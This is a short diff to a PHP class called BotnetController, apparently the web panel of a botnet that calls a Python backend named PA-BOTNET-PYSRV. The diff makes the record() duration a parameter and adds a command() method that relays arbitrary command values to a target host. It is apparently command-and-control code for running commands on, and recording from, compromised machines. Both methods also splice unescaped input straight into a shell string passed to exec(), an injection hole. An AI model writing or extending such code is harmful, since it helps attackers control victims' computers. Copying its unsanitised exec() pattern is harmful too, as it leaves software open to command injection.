@@ -232,10 +232,19 @@ class BotnetController extends Controller
         return $output;
     }
 
-    public function record($uid){
+    public function record($uid, $time){
         $path = env('PATH_PYTHON_EXECUTABLE');
 
-        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --record --time 10 --host ".$uid." > /dev/null 2>&1 & echo $!";
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --record --time ".$time." --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
+    public function command($uid, $value){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --command --value ".$value." --host ".$uid." > /dev/null 2>&1 & echo $!";
         exec($command, $output, $return);
 
         return $output;
